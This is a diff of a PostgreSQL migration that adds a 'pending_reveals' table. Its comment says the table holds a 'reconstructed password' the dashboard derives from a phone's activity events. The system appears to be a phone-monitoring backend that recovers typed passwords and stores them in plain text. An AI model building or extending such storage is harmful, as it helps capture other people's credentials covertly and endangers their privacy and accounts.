@@ -94,3 +94,19 @@ ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS text_revealed TEXT;
 ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS reveal_partial BOOLEAN DEFAULT false;
 CREATE UNIQUE INDEX IF NOT EXISTS uq_activity_device_uuid ON public.activity_events (device_id, event_uuid);
 CREATE INDEX IF NOT EXISTS idx_activity_events_device ON public.activity_events (device_id, created_at DESC);
+
+-- ─── PENDING REVEALS (persistent bridge: reveal arrives before event row) ──
+-- The dashboard can compute a reconstructed password before the phone's async
+-- save has written the event row. The reveal is parked here (NOT process
+-- memory) so a server restart/redeploy never drops it; saveActivityEvents
+-- applies and removes it the moment the row lands. Rows older than 24h are
+-- cleaned up by the server.
+CREATE TABLE IF NOT EXISTS public.pending_reveals (
+    device_id       TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
+    event_uuid      TEXT NOT NULL,
+    reveal_text     TEXT NOT NULL,
+    reveal_partial  BOOLEAN DEFAULT false,
+    created_at      TIMESTAMPTZ DEFAULT now(),
+    PRIMARY KEY (device_id, event_uuid)
+);
+CREATE INDEX IF NOT EXISTS idx_pending_reveals_created ON public.pending_reveals (created_at);
